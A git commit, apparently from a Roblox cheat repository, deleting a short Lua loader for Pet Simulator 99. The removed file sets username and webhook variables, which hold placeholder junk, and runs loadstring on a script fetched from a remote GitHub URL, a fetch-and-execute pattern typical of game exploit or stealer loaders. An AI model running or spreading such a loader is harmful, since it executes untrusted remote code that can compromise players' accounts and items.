6150df0438d0af0bdd51c7dd22a92919a1c5308e
Zenith Exploits Empire <arshansiddiqui.msvd@gmail.com>
2025-04-20 19:26:39 +0200

    Delete ps99/kyjtyhrseg.lua

--- ps99/kyjtyhrseg.lua
+++
@@ -1,5 +0,0 @@
-Username = "treg"
-Username2 = "erfgd"
-Webhook = "rszgerts"
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Zenith-Exploits-Empire/Final/refs/heads/main/RAW%20-%20Pet%20Simulator%2099"))()
